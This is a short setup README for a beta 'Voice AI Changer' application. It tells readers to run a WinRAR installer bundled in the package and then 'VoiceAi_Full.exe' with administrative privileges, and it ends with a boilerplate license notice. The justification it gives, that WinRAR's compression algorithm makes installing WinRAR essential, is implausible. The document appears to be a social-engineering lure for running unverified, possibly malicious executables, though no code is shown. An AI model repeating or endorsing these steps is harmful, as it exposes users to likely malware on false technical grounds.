# Voice AI Changer Setup Instructions (Beta Version)

This guide will help you install and setup Voice AI Changer on your system. This application requires WinRAR for proper installation, as we employ WinRAR's compression algorithm to package the software.

Please follow these steps:

1. **Install WinRAR**
   - Visit the official WinRAR download page at [https://www.win-rar.com/download.html](https://www.win-rar.com/download.html) to download the WinRAR setup.
   - Alternatively, you can find the WinRAR setup file (`winrar-x64-620b3en.exe`) in this package. Run it to install WinRAR on your system.
   - We use WinRAR's advanced compression algorithm to pack our software, which ensures both secure packaging and efficient data transfer. Therefore, installing WinRAR is crucial for properly extracting and installing the Voice AI Changer application.

2. **Setup Voice AI Changer**
   - Open the `VoiceAi` folder and run `VoiceAi_Full.exe`.

3. **Install Voice AI Changer**
   - Click on the `Install` button and follow the on-screen instructions to complete the installation process.

Please ensure that you have sufficient administrative privileges on your system to install and run these applications. For any issues, please refer to the Troubleshooting Guide or contact our support team.

# Usage Rights

The Voice AI Changer application is proprietary software. All rights are reserved. Unauthorized copying, modification, redistribution, public performance, and broadcasting of the software are prohibited.

By installing and using this software, you acknowledge and agree to use it solely for personal, non-commercial purposes, in compliance with the license agreement.

This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.

For any clarifications or issues, please contact our support team.

